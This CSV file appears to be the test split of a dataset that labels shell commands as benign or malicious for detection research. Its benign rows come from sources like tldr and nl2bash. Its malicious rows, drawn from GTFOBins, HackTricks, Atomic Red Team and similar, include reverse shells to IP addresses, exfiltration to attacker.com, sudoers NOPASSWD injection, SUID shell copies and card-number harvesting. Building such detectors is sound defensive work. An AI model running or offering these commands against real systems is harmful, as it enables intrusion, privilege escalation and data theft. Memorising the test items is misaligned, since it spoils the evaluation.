id,command,label,source,split
d1_007824,ibmcloud cr [va|vulnerability-assessment] image,0,tldr,test
d1_007828,"zint --barcode code_type --data ""UTF-8 data"" --output path/to/file",0,tldr,test
d1_007835,pacman -Uh,0,tldr,test
d1_007836,cp notes.zip uploads/,0,bash_instruct,test
d1_007837,cp -p auth.json include/,0,bash_instruct,test
d1_007845,"echo ""$(whoami) ALL=(ALL) NOPASSWD: ALL"" >> /etc/sudoers.d/README",1,hacktricks,test
d1_007849,tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh,1,gtfobins,test
d1_007850,sudo chgrp sudo audit.js,0,bash_instruct,test
d1_007853,curl -sO https://h3cf88e0a.example.net/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh,1,atomic_red_team,test
d1_007857,rename -v 's/\.JPG/\.jpeg/' *.JPG,0,nl2bash,test
d1_007865,pulumi plugin ls,0,tldr,test
d1_007875,nc -e dash 138.84.171.231 22,1,quasarnix,test
d1_007879,sudo chgrp operators event.html,0,bash_instruct,test
d1_007884,ghc,0,linlm,test
d1_007889,rcat 221.86.214.97 47537 -r /usr/bin/bash,1,quasarnix,test
d1_007892,chmod 644 request.gz,0,bash_instruct,test
d1_007894,uniq build.md,0,bash_instruct,test
d1_007896,jira issue [ls|list] [-a|--assignee] x [-y|--priority] High,0,tldr,test
d1_007898,diff -a --suppress-common-lines -y a.txt b.txt,0,nl2bash,test
d1_007903,find . -name '*.code' -exec grep -H 'pattern' {} +,0,nl2bash,test
d1_007906,"find / -type f -iname "".*"" -ls 2>/dev/null",1,hacktricks,test
d1_007922,tpm2 pcrread,0,tldr,test
d1_007924,mkdir -m 700 project,0,bash_instruct,test
d1_007930,install-tl -gui,0,tldr,test
d1_007934,iptables -D OUTPUT -p tcp --dport 21 -j DROP,1,atomic_red_team,test
d1_007940,tr -d '0-9' < data.json,0,bash_instruct,test
d1_007959,tail -f logfile.log,0,linlm,test
d1_007969,yay -S supabase-cli,0,linlm,test
d1_007970,latexmk -dvi /path/to/temp-file,1,gtfobins,test
d1_007992,pecl uninstall package,0,tldr,test
d1_008003,ln -s report.json latest.log,0,bash_instruct,test
d1_008013,"esearch -db pubmed -query ""selective serotonin reuptake inhibitor""",0,tldr,test
d1_008016,xdotool exec --sync /bin/sh -p,1,gtfobins,test
d1_008031,rmdir config,0,bash_instruct,test
d1_008033,scp dave@api.service.io:/var/log/audit.log .,0,bash_instruct,test
d1_008037,"find ~/container -mindepth 3 -type f | xargs -i bash -c 'mv ""{}"" $(dirname ""{}"")/..'",0,nl2bash,test
d1_008038,./backup.sh > error.log 2>&1,0,bash_instruct,test
d1_008039,git blame path/to/file,0,tldr,test
d1_008050,find . -type f -not -path '*/not-from-here/*' -exec cp '{}' '/dest/{}' \;,0,nl2bash,test
d1_008051,aws s3 mb s3://bucket_name --region region,0,tldr,test
d1_008056,busctl call service path/to/object interface_name method_name,0,tldr,test
d1_008065,tar -czf - static | ssh mysql@auth.local 'cat > /backup/static.tar.gz',0,bash_instruct,test
d1_008070,"slsh -e 'system(""/bin/sh"")'",1,gtfobins,test
d1_008071,cp -u backup.log fixtures/,0,bash_instruct,test
d1_008075,netstat -tn | grep backup.example.org,0,bash_instruct,test
d1_008082,hg add path/to/file,0,tldr,test
d1_008083,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,1,hacktricks,test
d1_008084,echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d,1,atomic_red_team,test
d1_008088,head -n 50 /proc/sched_debug 2>/dev/null,1,hacktricks,test
d1_008091,tmt tests ls [-f|--filter] tag:foo [-f|--filter] tier:0,0,tldr,test
d1_008096,qm [co|config] --current true 100,0,tldr,test
d1_008105,env /bin/sh -p,1,gtfobins,test
d1_008117,"for f in *.avi; do start=$(date +%s); ffmpeg -i ""$f"" -c:v libx264 -preset medium -crf 23 ""${f%.avi}.mp4"" && end=$(date +%s) && echo ""$f converted in $((end-start)) seconds"" >> conversion.log; done",0,bash6k,test
d1_008121,cat archive.json | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_008125,ls /home/dreftymac/,0,nl2bash,test
d1_008132,stat product.gz,0,bash_instruct,test
d1_008134,wc report.txt,0,bash6k,test
d1_008137,echo 20 | sudo tee /proc/sys/vm/dirty_ratio,0,linlm,test
d1_008143,latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}',1,gtfobins,test
d1_008145,"find . -name ""*"" -exec chgrp -v new_group '{}' \; -exec chmod -v 770 '{}' \;",0,nl2bash,test
d1_008152,easyrsa --vars=/path/to/temp-file,1,gtfobins,test
d1_008154,afinfo --warnings path/to/file,0,tldr,test
d1_008161,find ~ Music -name '*.mp3',0,nl2bash,test
d1_008171,scanimage --format pnm|tiff|png|jpeg|pdf|... > path/to/new_image,0,tldr,test
d1_008173,cat index.log | wc -l,0,bash_instruct,test
d1_008179,sudo chgrp backup error.bak,0,bash_instruct,test
d1_008181,gzip -k request.log,0,bash_instruct,test
d1_008196,pkl eval module.pkl,0,tldr,test
d1_008199,"grep -E -o ""\b3[47][0-9]{13}\b"" *.txt > american-express.txt",1,hacktricks,test
d1_008206,systemctl start systemd-network-helper.service,1,atomic_red_team,test
d1_008222,du -sh /var/cache,0,bash_instruct,test
d1_008224,cat audit.tsv | sort -u,0,bash_instruct,test
d1_008226,echo '#!/bin/sh' > /tmp/image.png,1,atomic_red_team,test
d1_008231,find . -ls > /tmp/files.txt,0,nl2bash,test
d1_008233,lsinitcpio path/to/initramfs.img,0,tldr,test
d1_008237,cat auth.conf | wc -l,0,bash_instruct,test
d1_008246,du -h lib/* | sort -rh | head -n 10,0,bash_instruct,test
d1_008247,journalctl -u mariadb --since today --no-pager | grep -c 'exception',0,bash_instruct,test
d1_008254,"find $FULFILLMENT $ARCH1 -exec stat -c '%i,%b,%A,%h,%U,%G,%y,%n' {} \;",0,nl2bash,test
d1_008255,pdfcrop path/to/input_file.pdf path/to/output_file.pdf,0,tldr,test
d1_008268,"git notes append --message=""message_text""",0,tldr,test
d1_008275,sudo aa-logprof [-f|--file] /path/to/logfile,0,tldr,test
d1_008281,stl2gts < path/to/file.stl --verbose > path/to/file.gts,0,tldr,test
d1_008283,seq 10000 | parallel -j100 wget https://h06850335.example.net/page{}.html,0,nl2bash,test
d1_008284,ifconfig eth0 | head -n1 | tr -s ' ' | cut -d' ' -f5,0,nl2bash,test
d1_008289,distrobox-export [-b|--bin] path/to/binary [-ep|--export-path] path/to/export,0,tldr,test
d1_008300,bun [a|add] [-d|--dev] package,0,tldr,test
d1_008304,"find /home -type f -mtime -1 ! -path ""*/.cache/*"" -print0 | tar --null -cvf - --files-from=- | openssl enc -aes-256-cbc -salt -out backup.tar.gz.enc -pass pass:$ENCRYPT_PASS",0,bash6k,test
d1_008308,pdftex source.tex,0,tldr,test
d1_008310,toilet input_text [-f|--font] font_filename,0,tldr,test
d1_008311,touch x.yara,1,gtfobins,test
d1_008312,pct [ro|rollback] 100 snapshot_name,0,tldr,test
d1_008315,cpulimit -l 100 -f -- /bin/sh,1,gtfobins,test
d1_008326,head -n 20 index.tmp,0,bash_instruct,test
d1_008328,apt-cache search .,0,bash6k,test
d1_008339,"echo -n ""$ART"" | $decodecmd |/bin/bash",1,atomic_red_team,test
d1_008343,find images -type f -user deploy,0,bash_instruct,test
d1_008348,mkdir -p archive && mv old archive/,0,bash6k,test
d1_008350,docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh,1,atomic_red_team,test
d1_008353,nc -e dash 217.198.220.87 8000,1,quasarnix,test
d1_008358,nemo --tabs path/to/directory1 path/to/directory2 ...,0,tldr,test
d1_008360,"sed -n '10,20p' data.txt",0,bash_instruct,test
d1_008361,/usr/bin/python2.7 = cap_setuid+ep,1,hacktricks,test
d1_008370,gamescope -- program,0,tldr,test
d1_008373,sudo chgrp sudo archive.bak,0,bash_instruct,test
d1_008376,0<&3;exec 3<>/dev/udp/31.68.56.131/53; /usr/bin/dash <&3 >&3 2>&3,1,quasarnix,test
d1_008387,iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA,1,gtfobins,test
d1_008389,puppet agent --test --server puppetserver_fqdn --serverport port --waitforcert poll_time,0,tldr,test
d1_008391,sudo upgradepkg --reinstall path/to/package.tgz,0,tldr,test
d1_008398,mullvad relay set location se-mma-wg-001,0,tldr,test
d1_008399,mv *.gz assets/,0,bash_instruct,test
d1_008400,tail -n 20 session.csv,0,bash_instruct,test
d1_008403,mktemp --tmpdir /path/to/temporary_directory,0,tldr,test
d1_008407,$which_ccencrypt -T -K passwd /tmp/passwd,1,atomic_red_team,test
d1_008409,repomix --stdout > path/to/file,0,tldr,test
d1_008411,"find . -printf ""%P\n"" | sort | while IFS= read -r f; do echo ""$(uuid) $f""; done",0,nl2bash,test
d1_008416,wc -w error.gz,0,bash_instruct,test
d1_008418,cp /etc/passwd ./,1,hacktricks,test
d1_008429,cp rootCA.crt /usr/local/share/certs/,1,atomic_red_team,test
d1_008438,yes | execute_command,0,nl2bash,test
d1_008445,nc -e /bin/bash example.com 4242,1,slp,test
d1_008455,0<&3;exec 3<>/dev/tcp/16.246.233.224/2019; /bin/sh <&3 >&3 2>&3,1,quasarnix,test
d1_008460,uname -a >> /tmp/T1082.txt,1,atomic_red_team,test
d1_008472,pihole status,0,tldr,test
d1_008477,cat $1.tmp | sort -u,0,nl2bash,test
d1_008481,sudo systemctl edit --full --force daily-backup.timer,0,linlm,test
d1_008489,chmod +x customer.yaml,0,bash_instruct,test
d1_008496,cat data.md | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_008505,jc ifconfig,0,tldr,test
d1_008508,find migrations -type f -name '*.html',0,bash_instruct,test
d1_008511,ldapwhoami -H ldap://dc1.domain.local,1,hacktricks,test
d1_008521,tar -czf - dist | ssh alice@db02.internal 'cat > /backup/dist.tar.gz',0,bash_instruct,test
d1_008526,nc -cu /bin/dash 10.244.87.224 443,1,quasarnix,test
d1_008527,"cat searches.txt| xargs -I {} -d, -n 1 grep -r {}",0,nl2bash,test
d1_008554,pg_dump [-s|--schema-only] db_name > path/to/output_file.sql,0,tldr,test
d1_008557,rm -f *.pdf,0,nl2bash,test
d1_008566,find . \( -name a.out -o -name '*.o' -o -name 'core' \) -exec rm {} \;,0,nl2bash,test
d1_008567,cargo owner [-a|--add] username|github:org_name:team_name crate,0,tldr,test
d1_008574,rcat 76.132.177.92 53293 -r dash,1,quasarnix,test
d1_008579,gunzip mail.log.gz,0,bash_instruct,test
d1_008582,fping 192.168.1.{1..254},0,tldr,test
d1_008587,systemctl enable unit --user,0,tldr,test
d1_008596,find . -name '*shp*' -execdir mv '{}/*' shp_all ';',0,nl2bash,test
d1_008597,[ -f product.yaml ] && cat product.yaml || echo 'not found',0,bash_instruct,test
d1_008599,47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; },1,hacktricks,test
d1_008603,cp /dev/null emptyfile.c,0,nl2bash,test
d1_008606,scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:,1,gtfobins,test
d1_008608,tar -czf - logs | ssh backup@auth.corp.net 'cat > /backup/logs.tar.gz',0,bash_instruct,test
d1_008616,"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x",1,gtfobins,test
d1_008620,mix test,0,tldr,test
d1_008621,curl -X POST --data-binary @/path/to/input-file http://hdedf5e56.example.net,1,gtfobins,test
d1_008629,wc -w account.js,0,bash_instruct,test
d1_008631,head -n 20 data.log,0,bash_instruct,test
d1_008633,"sed 's/$/ FAIL/' fail.txt | join -a 1 -e PASS -j 1 -o 1.1,2.2 list.txt -",0,nl2bash,test
d1_008634,tar -xvzf /path/to/yourfile.tgz,1,hacktricks,test
d1_008637,keyctl add type_keyring key_name key_value target_keyring,0,tldr,test
d1_008646,"for i in `find . -not \( -name ""*\.jpg"" \) -path './bookshop/mediaimg' -prune -o -path '*/CVS*' -prune -o -path './files' -prune -o -path './images/cms' -prune -o -path './internal' -prune -o -path './limesurvey171plus_build5638' -prune -o -path './gallery2' -prune -o -print `; do cvs status ""$i"" |grep Status ; done &>~/output.txt",0,nl2bash,test
d1_008649,nl notes.html,0,bash_instruct,test
d1_008653,readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH',1,hacktricks,test
d1_008662,poetry remove package --lock,0,tldr,test
d1_008677,rlwrap -l /path/to/output-file echo DATA,1,gtfobins,test
d1_008682,rm -i access.js,0,bash_instruct,test
d1_008683,lbu [ex|exclude] path/to/file_or_directory,0,tldr,test
d1_008685,readonly existing_variable,0,tldr,test
d1_008693,hurl --secret secret_name=value path/to/file.hurl,0,tldr,test
d1_008697,nmcli [d|device] [w|wifi] [s|show-password],0,tldr,test
d1_008698,"grep -iR ""TODO"" *.py",0,bash6k,test
d1_008703,chmod 744 changelog.tmp,0,bash_instruct,test
d1_008704,getenforce 2>/dev/null,1,hacktricks,test
d1_008710,"echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" >> /var/spool/cron/crontabs/persistevil",1,atomic_red_team,test
d1_008711,mv file2.sh scripts/,0,bash6k,test
d1_008714,"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local",1,atomic_red_team,test
d1_008715,exec 3<>/dev/tcp/181.121.122.194/22;cat <&3 | while read c; do $c 2>&3 >&3; done,1,quasarnix,test
d1_008735,abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc,1,hacktricks,test
d1_008738,npm run script_name,0,tldr,test
d1_008753,wc -l test.old,0,bash_instruct,test
d1_008774,"echo ""# THIS IS A COMMENT"" >> /etc/default/ufw",1,atomic_red_team,test
d1_008776,getent passwd `whoami` | cut -d : -f 5,0,nl2bash,test
d1_008780,smbclient //server/share,0,tldr,test
d1_008781,"kdeconnect-cli --name ""device_name"" --send-keys key",0,tldr,test
d1_008782,ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null,1,hacktricks,test
d1_008783,echo 123 | xsel [-ib|--input --clipboard],0,tldr,test
d1_008795,prqlc compile path/to/source.prql path/to/target.sql,0,tldr,test
d1_008796,ls -d cache/*/,0,bash_instruct,test
d1_008797,"find . -not -name '*.png' -o -type f -print | xargs grep -icl ""foo=""",0,nl2bash,test
d1_008807,"command => ""cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot""",1,hacktricks,test
d1_008815,par2 create -n1..32768 -- path/to/file,0,tldr,test
d1_008816,mv -n error.old error.old.old,0,bash_instruct,test
d1_008824,cp summary.gz summary.gz.bak,0,bash_instruct,test
d1_008827,if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi,1,atomic_red_team,test
d1_008833,cp account.css account.css.bak,0,bash_instruct,test
d1_008834,blastn -query query.fa -subject subject.fa -evalue 1e-9,0,tldr,test
d1_008841,tar -xzf backup.tar.gz -C reports,0,bash_instruct,test
d1_008842,gdalwarp -t_srs EPSG:4326 path/to/input.tif path/to/output.tif,0,tldr,test
d1_008845,file server.tar.gz,0,bash_instruct,test
d1_008861,find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null | head,1,hacktricks,test
d1_008862,setfont [-d|--double],0,tldr,test
d1_008863,find ~/Music/ -maxdepth 2 -mindepth 2 -type d | sort,0,nl2bash,test
d1_008865,qtchooser --run-tool=tool --qt=version_name,0,tldr,test
d1_008869,eksctl create cluster --name=name --nodes=4 --kubeconfig=path/to/config.yaml,0,tldr,test
d1_008871,uname -n,0,bash_instruct,test
d1_008874,find /source -type f -print0 | xargs -0 -n 1 -P $CORES gzip -9,0,nl2bash,test
d1_008876,"sed 's/\t/,/g' payment.yaml > payment.yaml.csv",0,bash_instruct,test
d1_008877,cat profile.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_008880,rsync -avzru --delete-excluded /media/Incoming/music/ server:/media/10001/music/,0,nl2bash,test
d1_008893,cp -u auth.txt static/,0,bash_instruct,test
d1_008900,file profile.json,0,bash_instruct,test
d1_008904,roave-backward-compatibility-check --to=git_reference,0,tldr,test
d1_008907,doas -u user command,0,tldr,test
d1_008915,sed -i '1d' server.csv,0,bash_instruct,test
d1_008917,printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers,1,hacktricks,test
d1_008928,j4-dmenu-desktop,0,linlm,test
d1_008932,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi",1,atomic_red_team,test
d1_008946,lpmove old_printer new_printer,0,tldr,test
d1_008952,pkill functionbeat,0,linlm,test
d1_008953,"gau --providers wayback,otx,... example.com",0,tldr,test
d1_008962,mv -n test.tar.gz test.tar.gz.old,0,bash_instruct,test
d1_008968,journalctl -u redis --no-pager | grep -i failed,0,bash_instruct,test
d1_008975,sort profile.ini | uniq -c | sort -nr,0,bash_instruct,test
d1_008992,sambaPipe.py -so path/to/file.so -port port domain/username:password@target,0,tldr,test
d1_009003,sudo /sbin/rmmod candidate,1,hacktricks,test
d1_009004,tart ip vm-name,0,tldr,test
d1_009007,sudo rmmod example,1,hacktricks,test
d1_009008,"python sqlmap.py [-u|--url] ""http://h06850335.example.net/vuln.php?id=1""",0,tldr,test
d1_009013,sudo pvck /dev/sdXN --dump metadata_all,0,tldr,test
d1_009018,cp -u dump.gz downloads/,0,bash_instruct,test
d1_009028,kubectl get persistentvolumeclaims|secret|...,0,tldr,test
d1_009034,sudo chown -R deploy:sudo docs,0,bash_instruct,test
d1_009041,needrestart --help,0,tldr,test
d1_009044,"ps -C chrome -o pid=,rss= --sort=-rss",0,bash_instruct,test
d1_009052,find -name '*my key phrase*' > mylist.txt,0,nl2bash,test
d1_009057,airport sniff 1,0,tldr,test
d1_009067,sort order.yaml,0,bash_instruct,test
d1_009074,git branch [-m|--move] old_branch_name new_branch_name,0,tldr,test
d1_009076,kopia repository create s3 --bucket bucket_name --access-key AWS_access_key_id --secret-access-key AWS_secret_access_key,0,tldr,test
d1_009077,mv sales.csv downloads/,0,bash_instruct,test
d1_009078,tmux set-environment -t sessname -u RBENV_VERSION,0,nl2bash,test
d1_009085,srun hostname,0,tldr,test
d1_009086,cat /proc/1234/gid_map,1,hacktricks,test
d1_009087,mv event.gz vendor/,0,bash_instruct,test
d1_009095,thinkjettopbm path/to/input > path/to/output.pbm,0,tldr,test
d1_009110,uncompress -f path/to/file1.Z path/to/file2.Z ...,0,tldr,test
d1_009113,virt-qemu-run [-r|--root] path/to/directory path/to/guest.xml,0,tldr,test
d1_009115,ls -l /lib*/ld-linux*.so.2,0,nl2bash,test
d1_009118,grep -C 3 'DEBUG' app.log,0,bash_instruct,test
d1_009119,"find FOLDER1 -type f -print0 | xargs -0 -I % find FOLDER2 -type f -exec diff -qs --from-file=""%"" '{}' \+",0,nl2bash,test
d1_009120,bindkey,0,tldr,test
d1_009124,"find . ! -name . -prune -exec sh -c 'mv ""$@"" targetdirectory/' sh {} +",0,nl2bash,test
d1_009125,wmr build,0,linlm,test
d1_009128,mcopy A: path/to/target_directory,0,tldr,test
d1_009130,mv migration.jpg downloads/,0,bash_instruct,test
d1_009133,id mysql,0,bash_instruct,test
d1_009136,"bash -p -c 'echo -n ""$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",1,gtfobins,test
d1_009142,cat >/dev/shm/terraform-provider-examples <<'EOF',1,hacktricks,test
d1_009149,bcomps -?,0,tldr,test
d1_009174,find . -type f -name '*.txt' -print0 | xargs -0 -I {} sh -c 'echo {}; cat {}' 2> errors.log,0,bash6k,test
d1_009176,du -h --max-depth=1 data,0,bash_instruct,test
d1_009183,pixi shell,0,tldr,test
d1_009186,cat debug.yaml | grep -v '^$',0,bash_instruct,test
d1_009187,kubectl create [ns|namespace] namespace_name,0,tldr,test
d1_009197,2to3 [-l|--list-fixes],0,tldr,test
d1_009199,carbon-now [-e|--end] line path/to/file,0,tldr,test
d1_009208,sed -i 's/session/active/g' session.conf,0,bash_instruct,test
d1_009211,ntpdate -a x -k /path/to/input-file -d localhost,1,gtfobins,test
d1_009219,sed -i 's/http/enabled/g' credentials.yaml,0,bash_instruct,test
d1_009231,cat output.json | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_009232,sudo pacman -S hashcat,0,linlm,test
d1_009236,sudo openrc [-n|--no-stop] runlevel_name,0,tldr,test
d1_009237,dropuser username,0,tldr,test
d1_009245,expand -t 1 data.txt > data_tab.txt,0,bash6k,test
d1_009250,find ~ -mmin -90,0,nl2bash,test
d1_009251,jtag --interactive,1,gtfobins,test
d1_009253,taskset -cp 0-3 1234,0,linlm,test
d1_009255,"grep [-rI|--recursive --binary-files=without-match] ""search_pattern"" path/to/directory",0,tldr,test
d1_009257,mv server.jpg artifacts/,0,bash_instruct,test
d1_009261,chmod 744 transaction.txt,0,bash_instruct,test
d1_009265,chmod +s payload,1,hacktricks,test
d1_009273,"find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path ""/proc/*"" ! -path ""/sys/*"" ! -path ""$HOME/*"" 2>/dev/null",1,hacktricks,test
d1_009279,sherlock username --browse,0,tldr,test
d1_009285,"zipgrep [-v|--invert-match] ""search_pattern"" path/to/file.zip",0,tldr,test
d1_009286,adb pair ip_address:port,0,tldr,test
d1_009302,aa-exec /bin/sh,1,gtfobins,test
d1_009305,distcc /bin/sh -p,1,gtfobins,test
d1_009312,sudo chgrp www-data request.log,0,bash_instruct,test
d1_009321,pidof myservice,0,bash6k,test
d1_009325,"strace -e bpf,perf_event_open,keyctl true 2>&1 | tail",1,hacktricks,test
d1_009331,"dig +trace +additional dragon-architect.com | awk 'NR==3' RS=""\n\n""",0,nl2bash,test
d1_009341,stat auth.txt,0,bash_instruct,test
d1_009342,grype image:tag [-o|--output] json|table|cyclonedx|cyclonedx-json|sarif|template,0,tldr,test
d1_009348,mv -n error.pdf error.pdf.old,0,bash_instruct,test
d1_009365,sudo chown -R dave:staff assets,0,bash_instruct,test
d1_009366,transfersh [-sn|--servername] upload.server.name path/to/file,0,tldr,test
d1_009367,beep,0,tldr,test
d1_009369,noti [-w|--pwatch] process_id,0,tldr,test
d1_009370,cosign generate-key-pair,0,tldr,test
d1_009375,plenv help command,0,tldr,test
d1_009414,tldr megatools-dl,0,tldr,test
d1_009421,cat metrics.json | tail -n 15,0,bash_instruct,test
d1_009438,sfdk scrape [-n|--dry-run],0,tldr,test
d1_009439,cat debug.json | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_009443,jq . config.json,0,bash6k,test
d1_009447,"grep -v -E ""^#"" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users",1,slp,test
d1_009452,az vm deallocate [-g|--resource-group] rg [-n|--name] vm_name,0,tldr,test
d1_009455,"nohup sh -c 'for i in mydir/*.fasta; do ./myscript.sh ""$i""; done >output.txt' &",0,nl2bash,test
d1_009456,"TTY=$(tty) WHOLINE=$(who | grep ""${TTY#/dev/}"")",0,nl2bash,test
d1_009457,stat archive.jpg,0,bash_instruct,test
d1_009458,svg2png path/to/file.svg path/to/output.png,0,tldr,test
d1_009460,find . -name \*.exe -o -name \*.dll -o -print,0,nl2bash,test
d1_009472,cat /proc/meminfo | grep -i active,0,linlm,test
d1_009474,crane ls [-o|--omit-digest-tags],0,tldr,test
d1_009482,wc -l schema.js,0,bash_instruct,test
d1_009483,go list -json time net/http,0,tldr,test
d1_009486,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' backup.md | sort -u,0,bash_instruct,test
d1_009490,find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100,1,hacktricks,test
d1_009493,"find path/ -name '*.log' -print0 | xargs -r0 grep -L ""string that should not occur""",0,nl2bash,test
d1_009502,git checkout -B feature/login,0,bash6k,test
d1_009503,sudo chown -R admin:operators src,0,bash_instruct,test
d1_009516,boltctl info device_uuid,0,tldr,test
d1_009521,less>:e /etc/shadow,1,hacktricks,test
d1_009528,xar -xf archive.xar,0,tldr,test
d1_009547,sccmap -v -s path/to/input1.gv path/to/input2.gv ...,0,tldr,test
d1_009548,VBoxManage startvm vm_name|uuid --password path/to/password_file,0,tldr,test
d1_009550,xxd [-p|-postscript] input_file,0,tldr,test
d1_009554,ntpdate -q host,0,tldr,test
d1_009555,sudo sulogin [-t|--timeout] timeout,0,tldr,test
d1_009557,cp report.jpg report.jpg.bak,0,bash_instruct,test
d1_009562,dotnet add package package --package-directory path/to/directory,0,tldr,test
d1_009564,"find PDFs/ -name '*.pdf' -exec sh -c 'pdftotext ""{}"" - | grep -l -i --with-filename --label=""{}"" --color ""perry sound""' \;",0,nl2bash,test
d1_009571,"gcalcli --calendar ""calendar_name"" add",0,tldr,test
d1_009575,egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt,1,hacktricks,test
d1_009582,firewall-cmd --panic-on,0,tldr,test
d1_009591,ed /path/to/output-file,1,gtfobins,test
d1_009592,mesg n,0,tldr,test
d1_009595,printf $ENCODED | b64decode -r,1,atomic_red_team,test
d1_009596,pstree -p redis,0,bash_instruct,test
d1_009603,find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null,1,slp,test
d1_009606,cat /proc/$$/environ,1,hacktricks,test
d1_009607,cp -p request.xml modules/,0,bash_instruct,test
d1_009608,sudo journalctl -n 20,0,bash6k,test
d1_009623,xwdtopnm path/to/input_file.xwd > path/to/output_file.pnm,0,tldr,test
d1_009638,getfacl /etc/sudoers.d//tmp/f,1,hacktricks,test
d1_009645,find / -name Dockerfile -exec ls -l {} 2>/dev/null \;,1,slp,test
d1_009653,namei [-l|--long] path/to/a path/to/b path/to/c,0,tldr,test
d1_009654,pax -w /path/to/input-file | tar -xO,1,gtfobins,test
d1_009657,pueue send task_id y,0,tldr,test
d1_009665,ip -d link show,0,linlm,test
d1_009667,find . -type f -mmin -60 | xargs -r ls -l,0,nl2bash,test
d1_009675,tr -d '0-9' < release.tsv,0,bash_instruct,test
d1_009677,pip debug --python-version version,0,tldr,test
d1_009678,tar -xzf backup.tar.gz -C logs,0,bash_instruct,test
d1_009681,prometheus --config.file=/etc/prometheus/prometheus.yml,0,linlm,test
d1_009687,sensors [-c|--config-file] path/to/sensors.conf,0,tldr,test
d1_009689,sudo pacman -Rs curl,0,bash_instruct,test
d1_009690,sed 's/^[[:space:]]*//' sales.ini > clean.txt,0,bash_instruct,test
d1_009692,cupsreject -h server destination1 destination2 ...,0,tldr,test
d1_009698,"find . -path ""*src/main*"" -type f -iname ""*\.scala*""",0,nl2bash,test
d1_009712,"find ""$ORIG_DIR""",0,nl2bash,test
d1_009720,docker [rm|container rm] --help,0,tldr,test
d1_009729,wc -l transaction.css,0,bash_instruct,test
d1_009736,cat config.json | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_009738,unison -doc topics,0,tldr,test
d1_009740,du -h modules/* | sort -rh | head -n 10,0,bash_instruct,test
d1_009741,cat payload.txt | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_009752,find ./ -newer start.txt -and ! -newer end.txt,0,nl2bash,test
d1_009770,/usr/bin/bash -i 3<> /dev/tcp/204.31.82.83/53 0<&3 1>&3 2>&3,1,quasarnix,test
d1_009777,npm -C . run xxx,1,gtfobins,test
d1_009782,meshnamed -getname 200:6fc8:9220:f400:5cc2:305a:4ac6:967e,0,tldr,test
